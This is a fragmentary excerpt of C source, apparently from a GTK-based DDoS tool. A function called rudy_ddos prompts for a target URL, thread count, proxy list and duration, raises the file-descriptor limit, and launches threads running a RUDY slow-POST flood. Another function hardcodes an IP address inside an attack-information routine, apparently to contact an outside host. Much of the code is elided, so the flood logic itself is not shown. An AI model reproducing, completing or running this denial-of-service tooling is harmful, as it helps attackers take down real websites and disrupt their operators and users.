...
void rudy_ddos(void)
{
    ...
    const gchar *scrape_string = NULL;
    ...
    gtk_text_buffer_set_text(text_buffer, "Usage: <target url> <scrape (1 or 0)> <number threads> <proxy list> <time>", -1);
    ...
    scrape_dialog = gtk_dialog_new_with_buttons("Enter scrape setting (1 or 0)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    ...
    gtk_widget_set_size_request(scrape_dialog, 360, 100);
    ...
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(scrape_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
    ...
    gtk_widget_show_all(GTK_DIALOG(scrape_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(scrape_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            scrape_string = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_2));
            gtk_widget_hide(scrape_dialog);
            break;
    ...
    switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
    {
        ...
        default:
            ...
            gtk_widget_destroy(scrape_dialog);
	...
	const rlim_t kOpenFD = 1024 + (atoi(threads_number_string) * 2);
	struct rlimit rl;
...
END:
	...
	pthread_t thread[atoi(threads_number_string)];
	struct list *td[atoi(threads_number_string)];
	...
	for(i = 0; i < atoi(threads_number_string); i++)
	{
		pthread_create( &thread[i], NULL, &flood_rudy, (void *) td[i]);
	}
	//sleep(atoi(argv[5]));
...
int fnAttackInformation(int attackID)
{
	...
	char packet[1024];
	char ip[] = "37.221.170.5"; /*** IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIICIIIIIIIIIIIIIIIIIIIIIIIIII !!!!!!!!!!!!!!!!!!! **/
